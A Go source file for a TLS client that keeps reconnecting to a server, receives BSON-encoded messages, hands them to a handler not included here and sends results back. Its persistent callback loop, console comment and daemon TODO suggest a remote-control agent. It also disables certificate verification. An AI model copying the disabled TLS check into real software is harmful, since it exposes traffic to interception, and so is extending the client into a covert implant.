package client

import (
	"bufio"
	"crypto/tls"
	"gopkg.in/mgo.v2/bson"
	"log"
	"net"
	"soulless_network/relations"
	"time"
)

type Client struct {
	Addr       string
	Conn       net.Conn
	ReconnTime time.Duration
}

// Что будет если коннекшин разорветься здесь когда мы в консоли (разрыв на получении данных)
func (c *Client) Run() {
	c.connect()

	for {
		log.Print("*")
		msg, err := c.read()

		if err != nil {
			log.Println(err)
			c.reconnect()
			continue
		}

		res := c.handle(msg)
		c.write(res)
	}
}

func (c *Client) connect() {
	conn, err := c.dial()

	if err != nil {
		log.Println("[TCP] Dialing connection", err)
		c.reconnect()
		return
	}

	log.Printf("[TCP] Successfully connected %s", c.Addr)
	c.Conn = conn
}

func (c *Client) reconnect() {
	log.Printf("[*] Reconnecting in %d seconds\n", c.ReconnTime)
	time.Sleep(c.ReconnTime * time.Second)
	c.connect()
}

func (c *Client) dial() (*tls.Conn, error) {
	dialer := &net.Dialer{KeepAlive: 1 * time.Second}
	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	return tls.DialWithDialer(dialer, "tcp", c.Addr, conf)
}

// TODO: hello msg to leave dial
// TODO: save logs to file
// TODO: add daemon file

func (c *Client) write(res *relations.Result) (error) {
	b, err := bson.Marshal(res)

	if err != nil {
		log.Printf("[BSON] Marshaling message %s\n", err)
		return err
	}

	_, err = c.Conn.Write(append(b, '\r'))

	if err != nil {
		log.Printf("[TCP] Writing the message %s\n", err)
		return err
	}

	return nil
}

func (c *Client) read() (*relations.Message, error) {
	reader := bufio.NewReader(c.Conn)
	b, err := reader.ReadBytes('\r')

	if err != nil {
		log.Printf("[TCP] Reading the sent message %s\n", err)
		return nil, err
	}

	msg := &relations.Message{}
	err = bson.Unmarshal(b, msg)

	if err != nil {
		log.Printf("[BSON] Unmarshaling message %s\n", err)
		return msg, nil
	}

	return msg, nil
}

func (c *Client) handle(msg *relations.Message) (*relations.Result) {
	h := Handler{msg}
	return h.handle()
}
